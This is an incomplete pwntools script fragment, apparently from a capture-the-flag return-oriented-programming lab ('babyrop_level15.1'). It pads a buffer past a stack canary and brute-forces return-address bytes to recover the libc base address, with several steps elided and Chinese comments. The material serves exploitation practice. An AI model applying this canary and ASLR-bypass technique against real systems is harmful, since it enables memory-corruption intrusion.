import psutil
from pwn import *
BINARY = "/challenge/babyrop_level15.1"
context.arch = 'amd64'
...
buf = b"A" * 0x28 # not including canary
canary = b"\x00"
# 容易暴力不出来
...
start_addr = b"\x69"  # 经典0x24069

for i in range(16):
    start_addr_tmp = start_addr + p8(i*16 + 0)
...
start_addr = int.from_bytes(start_addr, "little")
libc.address = start_addr - 0x24069
